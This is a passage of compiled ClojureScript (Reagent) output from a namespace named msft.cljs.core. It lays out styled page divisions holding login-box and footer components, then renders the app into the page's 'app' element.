cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.mobile_login_box], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.z2.absolute.bottom-0.left-0.right-0.xs-hide","div.z2.absolute.bottom-0.left-0.right-0.xs-hide",1053282167),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"background","background",-863952629),"rgba(0,0,0,0.6)",new cljs.core.Keyword(null,"font-size","font-size",-1847940346),"12px",new cljs.core.Keyword(null,"line-height","line-height",1870784992),"28px"], null)], null),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.footer], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.z2.absolute.bottom-0.left-0.right-0.sm-hide.md-hide.lg-hide","div.z2.absolute.bottom-0.left-0.right-0.sm-hide.md-hide.lg-hide",1573434800),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"font-size","font-size",-1847940346),"12px",new cljs.core.Keyword(null,"line-height","line-height",1870784992),"28px"], null)], null),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.mobile_footer], null)], null)], null);
});
msft.cljs.core.main = (function msft$cljs$core$main(){
return reagent.core.render_component.call(null,new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.app], null),goog.dom.getElement("app"));
});
msft.cljs.core.main.call(null);

//# sourceMappingURL=core.js.map
